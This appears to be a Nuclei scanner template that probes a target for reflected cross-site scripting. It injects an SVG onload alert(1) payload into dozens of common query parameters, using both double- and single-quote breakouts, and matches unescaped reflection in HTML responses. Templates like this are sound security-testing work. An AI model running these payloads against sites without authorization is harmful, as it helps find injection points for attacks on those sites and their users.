id: xss-svg-onload

info:
  name: Top XSS Check
  author: reewardius
  severity: medium
  tags: xss,generic
  
http:
  - method: GET
    path:
      - "{{BaseURL}}/?admin=\"><svg onload=alert(1)>&back=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?blog=\"><svg onload=alert(1)>&callback=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?console=\"><svg onload=alert(1)>&contact=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?contact_us=\"><svg onload=alert(1)>&create=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?data=\"><svg onload=alert(1)>&date=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?debug=\"><svg onload=alert(1)>&default=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?delete=\"><svg onload=alert(1)>&download=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?edit=\"><svg onload=alert(1)>&email=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?error=\"><svg onload=alert(1)>&file=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?export=\"><svg onload=alert(1)>&filename=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?id=\"><svg onload=alert(1)>&import=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?info=\"><svg onload=alert(1)>&item=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?jsonp=\"><svg onload=alert(1)>&l=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?lang=\"><svg onload=alert(1)>&language=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?link=\"><svg onload=alert(1)>&message=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?login=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?logout=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?name=\"><svg onload=alert(1)>&news=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?p=\"><svg onload=alert(1)>&page=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?password=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?path=\"><svg onload=alert(1)>&public=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?profile=\"><svg onload=alert(1)>&username=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?q=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?query=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?register=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?s=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?search=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?server=\"><svg onload=alert(1)>&show=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?subscribe=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?token=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?uri=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?url=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_compaign=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_content=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_medium=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_source=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_term=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/search?q=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/search?query=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/search?s=\"><svg onload=alert(1)>"
      - "{{BaseURL}}/?admin=\'><svg onload=alert(1)>&back=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?blog=\'><svg onload=alert(1)>&callback=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?console=\'><svg onload=alert(1)>&contact=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?contact_us=\'><svg onload=alert(1)>&create=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?data=\'><svg onload=alert(1)>&date=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?debug=\'><svg onload=alert(1)>&default=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?delete=\'><svg onload=alert(1)>&download=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?edit=\'><svg onload=alert(1)>&email=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?error=\'><svg onload=alert(1)>&file=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?export=\'><svg onload=alert(1)>&filename=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?id=\'><svg onload=alert(1)>&import=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?info=\'><svg onload=alert(1)>&item=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?jsonp=\'><svg onload=alert(1)>&l=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?lang=\'><svg onload=alert(1)>&language=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?link=\'><svg onload=alert(1)>&message=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?login=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?logout=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?name=\'><svg onload=alert(1)>&news=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?p=\'><svg onload=alert(1)>&page=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?password=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?path=\'><svg onload=alert(1)>&public=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?profile=\'><svg onload=alert(1)>&username=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?q=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?query=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?register=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?s=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?search=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?server=\'><svg onload=alert(1)>&show=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?subscribe=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?token=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?uri=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?url=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_compaign=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_content=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_medium=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_source=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/?utm_term=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/search?q=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/search?query=\'><svg onload=alert(1)>"
      - "{{BaseURL}}/search?s=\'><svg onload=alert(1)>"
      
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<svg onload=alert(1)>"
        part: body
        
      - type: word
        part: header
        words:
          - text/html